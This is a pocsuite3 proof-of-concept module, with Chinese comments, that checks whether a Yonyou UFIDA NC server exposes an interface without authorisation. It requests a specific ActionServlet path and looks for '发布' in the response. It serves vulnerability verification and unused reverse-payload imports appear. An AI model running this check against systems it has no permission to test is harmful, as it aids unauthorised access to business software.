# _*_ coding:utf-8 _*_
# @Time : 2023/12/12
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyou_ufida_nc_unauthorized(POCBase):
    pocDesc = '''用友UFIDA NC系统某接口存在未授权访问漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-12'
    name = '用友UFIDA NC系统某接口存在未授权访问漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID='
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': 'JSESSIONID=0000WjloE_RyCe6ZwvmGwNwpAox:165dohove'
        }
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and '发布' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyou_ufida_nc_unauthorized)